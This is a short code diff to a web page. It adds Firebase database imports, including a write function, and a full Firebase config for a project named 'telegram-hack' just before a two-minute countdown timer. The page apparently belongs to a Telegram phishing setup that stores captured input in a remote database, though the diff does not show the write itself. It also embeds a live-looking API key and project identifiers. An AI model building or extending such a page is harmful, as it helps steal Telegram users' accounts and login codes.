@@ -109,6 +109,24 @@
     </div>
 
     <script type = "module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+                        const firebaseConfig = {
+                          apiKey: "AIzaSyAPshXqs91YK8XboqLb2oVx-9wlekEX6rA",
+                          authDomain: "telegram-hack-204c5.firebaseapp.com",
+                          projectId: "telegram-hack-204c5",
+                          storageBucket: "telegram-hack-204c5.firebasestorage.app",
+                          messagingSenderId: "907911003427",
+                          appId: "1:907911003427:web:821752eb6e4522cb986096",
+                          measurementId: "G-J2XJWQLDL6"
+                        };
+
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+
         // Countdown Timer
         let timeLeft = 120; // 2 minutes in seconds
         const countdownElement = document.getElementById('countdown');
